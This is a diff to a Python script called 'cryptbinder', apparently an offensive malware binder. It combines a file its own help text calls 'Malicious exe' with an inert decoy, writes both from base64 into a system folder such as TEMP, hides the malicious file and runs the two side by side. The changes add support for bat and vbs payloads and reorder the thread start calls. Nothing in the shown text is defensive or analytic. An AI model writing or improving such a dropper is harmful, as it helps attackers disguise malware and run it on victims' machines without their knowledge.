@@ -24,9 +24,9 @@ def randVar():
 	return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))
 
 parser = argparse.ArgumentParser(prog='cryptbinder', usage='./cryptbinder.py [options]')
-parser.add_argument('-m', "--mexe", type=str, help='Malicious exe to drop and run.')
-parser.add_argument('-i', "--iexe", type=str, help='Inert exe to drop and run.')
-parser.add_argument("-v", "--var", type=str, help="System variable to place the exes, eg TEMP")
+parser.add_argument('-m', "--mexe", type=str, help='Malicious exe/bat/vbs to drop, hide and run.')
+parser.add_argument('-i', "--iexe", type=str, help='Inert exe/bat/vbs to drop and run.')
+parser.add_argument("-v", "--var", type=str, help="System variable to place the files, eg TEMP")
 args = parser.parse_args()
 
 if not args.mexe or not args.iexe or not args.var:
@@ -83,8 +83,8 @@ for p in paths:
 			out.write(p[1].decode('base64'))
 
 t1 = threading.Thread(target = ft1)
-t1.start()
 t2 = threading.Thread(target = ft2)
+t1.start()
 t2.start()
 ''' % (args.var, args.mexe.split(os.sep)[-1], mexe.replace('\n', ''), args.iexe.split(os.sep)[-1], iexe.replace('\n', ''))
 
